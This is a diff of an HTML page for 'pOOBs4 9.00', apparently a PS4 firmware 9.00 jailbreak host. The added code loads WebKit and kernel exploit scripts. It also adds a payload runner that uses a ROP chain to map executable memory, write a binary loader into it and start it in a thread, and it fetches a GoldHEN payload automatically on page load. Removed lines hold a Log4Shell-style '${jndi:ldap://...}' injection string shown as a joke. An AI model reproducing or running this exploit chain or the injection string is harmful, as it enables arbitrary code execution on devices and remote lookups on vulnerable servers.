@@ -3,88 +3,66 @@
 <head>
     <title>pOOBs4 9.00</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body {
-            background-color: #242629;
-        }
+    <link href="assets/css/style.css" rel="stylesheet">
 
-        .loader {
-            position: absolute;
-            left: 50%;
-            top: 50%;
-            margin: -75px 0 0 -75px;
+    <script src="assets/js/int64.js"></script>
+    <script src="assets/js/rop.js"></script>
+    <script src="assets/js/kexploit.js"></script>
+    <script src="assets/js/wexploit.js"></script>
 
-            border: 10px solid #1f1e1e;
-            border-radius: 50%;
-            border-top: 10px solid #044595;
-            border-left: 10px solid #044595;
-            width: 120px;
-            height: 120px;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        .info {
-            overflow: hidden;
-            position: fixed;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-
-            font-size: 45px;
-            font-family: sans-serif;
-            color: #b8b8b8;
-
-            transform: translate(-50%, -50%);
-        }
-
-        .j {
-            font-size: 15px;
-            color: #2F3335;
-        }
-    </style>
     <script>
-        function allset() {
-            document.getElementById("loader").style.display = "none";
-            document.getElementById("allset").style.display = "block";
+        function run_payload(payload_data) {
+            var payload_buffer = chain.syscall(477, 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
+            var payload_loader = p.malloc32(payload_data.length);
+
+            //NOTE: You can replace this with a payload instead of the loader.
+            //You would need to create an array view of payload_buffer to do that. (var payload_writer = p.array_from_address(payload_buffer);)
+            //And other ways, ....
+
+            //This is  x86_64 asm, you can disassemble it* if you want to know what the payload loader does under the hood. (* will need to account for endianness)
+            var loader_writer = payload_loader.backing;
+            for(var i = 0; i < payload_data.length / 4; i++) {
+                var hex = payload_data.slice(i * 4, 4 + i * 4)
+                    .split("").reverse().join("").split("")
+                    .map(function(s) {
+                        return ("0000" + s.charCodeAt(0).toString(16)).slice(-2);
+                    }).join("");
+                loader_writer[i] = parseInt(hex, 16);
+            }
+            chain.syscall(74, payload_loader, 0x4000, (0x1 | 0x2 | 0x4));
+
+            var pthread = p.malloc(0x10);
+            {
+                chain.fcall(window.syscalls[203], payload_buffer, 0x300000);
+                chain.fcall(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
+            }
+            chain.run();
         }
 
-        function awaitpl() {
-            document.getElementById("loader").style.display = "none";
-            document.getElementById("awaiting").style.display = "block";
+        function load_payload(payload_file) {
+            var req = new XMLHttpRequest();
+            req.open("GET", payload_file, true);
+            req.overrideMimeType("text/plain; charset=x-user-defined");
+            req.onload = function(e) {
+                if(this.status == 200) {
+                    run_payload(this.response);
+                }
+            };
+            req.send();
+        }
+
+        function run_exploits() {
+            wexploit();
+            kexploit();
+            
+            load_payload("assets/payloads/goldhen_2.2_900.bin");
         }
     </script>
-    <script src="int64.js"></script>
-    <script src="rop.js"></script>
-    <script src="kexploit.js"></script>
-    <script src="webkit.js"></script>
 </head>
 
 </html>
 
-<body onload="setTimeout(poc, 1500);">
-
-    <div id="loader" class="loader"></div>
-    <div id="awaiting" class="info" style="display:none;">
-        Awaiting Payload...
-        <br />
-        <span class="j">${jndi:ldap://nsa.gov}</span>
-    </div>
-
-    <div id="allset" class="info" style="display:none;">
-        You're all set!
-    </div>
-
+<body onload="setTimeout(run_exploits, 1500);">
+    <div id="loader" class="circle"></div>
+    <div id="status" class="status">Running exploits...</div>
 </body>
-<script>
-
-</script>
